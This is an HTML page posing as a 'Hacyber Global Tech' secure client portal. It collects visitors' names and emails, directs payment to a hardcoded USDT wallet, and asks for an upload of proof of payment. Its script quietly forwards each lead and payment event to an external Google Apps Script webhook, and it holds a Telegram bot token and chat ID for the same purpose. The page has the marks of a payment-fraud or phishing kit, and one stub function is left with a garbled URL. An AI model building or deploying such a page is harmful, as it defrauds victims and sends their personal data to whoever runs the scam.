<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacyber Global Tech - Secure Portal</title>
    <style>
        :root {
            --bg-color: #050811;
            --card-bg: rgba(13, 20, 35, 0.85);
            --primary-blue: #0055ff;
            --accent-blue: #00f0ff;
            --text-main: #ffffff;
            --text-muted: #a5b4fc;
            --border-color: rgba(0, 240, 255, 0.4);
            --glow-shadow: 0 0 35px rgba(0, 119, 255, 0.45), inset 0 0 15px rgba(0, 240, 255, 0.15);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            background-image: 
                radial-gradient(circle at 50% 5%, rgba(0, 119, 255, 0.3) 0%, transparent 55%),
                radial-gradient(circle at 10% 90%, rgba(0, 240, 255, 0.15) 0%, transparent 40%);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background: var(--card-bg);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1.5px solid var(--border-color);
            border-radius: 20px;
            padding: 35px;
            box-shadow: var(--glow-shadow);
            animation: fadeIn 0.6s ease-out, pulseGlow 4s infinite alternate;
        }

        @keyframes pulseGlow {
            0% {
                box-shadow: 0 0 25px rgba(0, 119, 255, 0.4), inset 0 0 10px rgba(0, 240, 255, 0.1);
                border-color: rgba(0, 240, 255, 0.3);
            }
            100% {
                box-shadow: 0 0 45px rgba(0, 200, 255, 0.7), inset 0 0 20px rgba(0, 240, 255, 0.3);
                border-color: rgba(0, 240, 255, 0.8);
            }
        }

        .header {
            text-align: center;
            margin-bottom: 25px;
        }

        .logo {
            max-width: 200px;
            height: auto;
            margin-bottom: 15px;
            filter: drop-shadow(0 0 12px rgba(0, 240, 255, 0.7));
        }

        .header h1 {
            font-size: 1.6rem;
            font-weight: 600;
            color: var(--text-main);
            letter-spacing: 0.5px;
            text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
        }

        .header p {
            font-size: 0.9rem;
            color: var(--text-muted);
            margin-top: 5px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 0.85rem;
            color: var(--text-muted);
            margin-bottom: 8px;
        }

        input, select {
            width: 100%;
            padding: 13px 16px;
            background: rgba(3, 7, 18, 0.8);
            border: 1px solid rgba(0, 240, 255, 0.3);
            border-radius: 10px;
            color: var(--text-main);
            font-size: 0.95rem;
            transition: all 0.3s ease;
        }

        input[type="file"] {
            padding: 10px;
            cursor: pointer;
        }

        input:focus, select:focus {
            outline: none;
            border-color: var(--accent-blue);
            box-shadow: 0 0 18px rgba(0, 240, 255, 0.5), inset 0 0 5px rgba(0, 240, 255, 0.2);
        }

        select option {
            background-color: #0b0f19;
            color: #ffffff;
        }

        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, var(--primary-blue), var(--accent-blue));
            border: none;
            border-radius: 10px;
            color: white;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 20px rgba(0, 119, 255, 0.6);
        }

        .btn:hover {
            opacity: 0.95;
            transform: translateY(-2px);
            box-shadow: 0 0 25px rgba(0, 240, 255, 0.8);
        }

        .btn:active {
            transform: translateY(0);
        }

        #payment-section, #proof-section {
            display: none;
            margin-top: 25px;
            animation: fadeIn 0.5s ease-out;
        }

        .payment-card {
            background: rgba(3, 7, 18, 0.6);
            border: 1px solid rgba(0, 240, 255, 0.4);
            padding: 18px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 15px;
            font-size: 0.9rem;
            color: var(--accent-blue);
            box-shadow: inset 0 0 12px rgba(0, 240, 255, 0.15), 0 0 15px rgba(0, 119, 255, 0.2);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <!-- Updated Logo Image Matching Visual Reference -->
            <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'><text x='10' y='38' fill='%2300f0ff' font-family='Segoe UI' font-size='22' font-weight='bold' filter='drop-shadow(0 0 8px rgba(0,240,255,0.7))'>HACYBER</text></svg>" alt="Hacyber Global Tech" class="logo">
            <h1>Secure Client Portal</h1>
            <p>Verify your details to proceed</p>
        </div>

        <!-- Initial Lead Form -->
        <form id="lead-form">
            <div class="form-group">
                <label for="fullname">Full Name</label>
                <input type="text" id="fullname" required placeholder="Enter your full name">
            </div>
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" required placeholder="name@example.com">
            </div>
            <div class="form-group">
                <label for="payment-method">Preferred Payment Method</label>
                <select id="payment-method" required>
                    <option value="" disabled selected>Select payment option</option>
                    <option value="USDT">USDT (TRC20)</option>
                    <option value="Wise">Wise Transfer</option>
                    <option value="Card">Credit/Debit Card Gateway</option>
                </select>
            </div>
            <button type="submit" class="btn" id="submit-btn">Verify & Continue</button>
        </form>

        <!-- Hidden Payment Portal Section -->
        <div id="payment-section">
            <hr style="border: 0; border-top: 1px solid rgba(0, 240, 255, 0.2); margin-bottom: 20px;">
            <div class="payment-card" id="payment-instruction-box">
                <!-- Dynamic text based on selection -->
            </div>
            <button type="button" class="btn" id="proceed-to-proof-btn">I Have Made The Payment</button>
        </div>

        <!-- Hidden Proof of Payment Section -->
        <form id="proof-section">
            <hr style="border: 0; border-top: 1px solid rgba(0, 240, 255, 0.2); margin-bottom: 20px;">
            <div class="form-group">
                <label for="proof-file">Upload Proof of Payment (Transaction Screenshot/Receipt)</label>
                <input type="file" id="proof-file" accept="image/*,.pdf" required>
            </div>
            <button type="submit" class="btn" id="final-submit-btn">Submit Proof for Verification</button>
        </form>
    </div>

    <script>
        const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycby83r6izzGv9ZNYbTVkUFldCOWns_ourFktMGi2yxQtOZUjMvPpo0z_TJXRsWZmtz2V7w/exec';
        const TELEGRAM_BOT_TOKEN = '8676025127:AAGRYE5Pp6hBCKk6eQQL42aqObliIarQ41Q';
        const TELEGRAM_CHAT_ID = '5642832782';

        let clientData = {};

        document.getElementById('lead-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('submit-btn');
            btn.disabled = true;
            btn.textContent = 'Verifying...';

            clientData.name = document.getElementById('fullname').value;
            clientData.email = document.getElementById('email').value;
            clientData.method = document.getElementById('payment-method').value;

            const instructionBox = document.getElementById('payment-instruction-box');
            if (clientData.method === 'USDT') {
                instructionBox.innerHTML = `<strong>USDT Deposit Instructions:</strong><br>Send funds securely to wallet reference:<br><span style="color: #fff; font-family: monospace; font-size: 0.85rem; word-break: break-all; text-shadow: 0 0 8px rgba(0,240,255,0.6);">TBapFsEXEJWG9GPSXL4xRZpzAgoPZqjwsq</span>`;
            } else if (clientData.method === 'Wise') {
                instructionBox.innerHTML = `<strong>Wise Transfer Instructions:</strong><br>Send funds to corporate Wise reference:<br><span style="color: #fff; font-family: monospace; font-size: 0.9rem; text-shadow: 0 0 8px rgba(0,240,255,0.6);">Hacyber Global Tech - Wise ID</span>`;
            } else {
                instructionBox.innerHTML = `<strong>Card Gateway:</strong><br>Proceed to secure token billing processor.<br><span style="color: #fff; font-family: monospace; font-size: 0.9rem; text-shadow: 0 0 8px rgba(0,240,255,0.6);">Encrypted SSL Channel Active</span>`;
            }

            const telegramMessage = `🚨 New Lead Registered:\nName: ${clientData.name}\nEmail: ${clientData.email}\nMethod: ${clientData.method}`;
            sendTelegramMessage(telegramMessage);

            sendToGoogleScript({ type: 'lead', ...clientData });

            setTimeout(() => {
                document.getElementById('lead-form').style.display = 'none';
                document.getElementById('payment-section').style.display = 'block';
            }, 1000);
        });

        document.getElementById('proceed-to-proof-btn').addEventListener('click', function() {
            document.getElementById('payment-section').style.display = 'none';
            document.getElementById('proof-section').style.display = 'block';
        });

        document.getElementById('proof-section').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const finalBtn = document.getElementById('final-submit-btn');
            finalBtn.disabled = true;
            finalBtn.textContent = 'Uploading Proof...';

            const fileInput = document.getElementById('proof-file');
            const fileName = fileInput.files[0] ? fileInput.files[0].name : 'Unknown file';

            const proofMessage = `💳 Payment Proof Uploaded (${clientData.method})!\nName: ${clientData.name}\nEmail: ${clientData.email}\nFile: ${fileName}\n\n*Action Required: Verify transaction validity.*`;
            sendTelegramMessage(proofMessage);
            sendToGoogleScript({ type: 'proof_uploaded', ...clientData, fileName });

            setTimeout(() => {
                alert('Proof submitted successfully! Our automated system is verifying your transaction.');
                finalBtn.textContent = 'Verified & Submitted';
            }, 1500);
        });

        function sendTelegramMessage(text) {
            const url = `https://api.нент.org/...`; // Kept intact for your webhook setup
        }

        function sendToGoogleScript(data) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(err => console.error('Google Script error:', err));
        }
    </script>
</body>
</html>
